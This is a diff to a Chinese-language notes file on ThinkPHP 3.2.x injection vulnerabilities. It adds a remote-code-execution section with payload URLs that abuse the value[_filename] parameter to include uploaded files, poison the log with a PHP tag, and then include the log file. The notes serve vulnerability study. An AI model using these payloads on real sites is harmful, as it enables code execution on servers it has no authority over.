@@ -5,7 +5,29 @@ tp3注入总结。
 漏洞版本3.2.3，听说这个版本是tp3使用最广泛的版本，但是截止到2021应该已经都升级到3.2.5。         
 3.2.5是tp3最后一个版本，修复了下面这些注入漏洞。    
 
-附加了一个缓存的洞，出镜率比较高。其实tp3还有一堆命令执行的可直接看最后的参考文章，写的都不错。   
+附加了一个缓存的洞，出镜率比较高。其实tp3还有一堆命令执行的可直接看最后的参考文章，写的都不错。 
+
+## 3.2.x RCE
+
+payload
+上传具有恶意代码的任何文件到服务器上，直接包含其文件相对或绝对路径即可。
+```
+例如：http://127.0.0.1/thinkphp/index.php?m=Home&c=Index&a=index&value[_filename]=./[filename]
+```
+
+写phpinfo到日志文件
+```
+http://127.0.0.1/thinkphp/index.php?m=--><?=phpinfo();?>
+
+```
+
+包含日志文件
+```
+http://127.0.0.1/thinkphp/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/common/21_07_12.log
+
+```
+
+
 
 ## exp注入
 ```
@@ -77,6 +99,7 @@ md5(name)=b068931cc450442b63f5b3d276ea4297，
 - https://xz.aliyun.com/t/2630
 - https://www.freebuf.com/vuls/282906.html
 - https://www.anquanke.com/post/id/250537
+- https://blog.csdn.net/qq_43697234/article/details/118931542
 
 
 
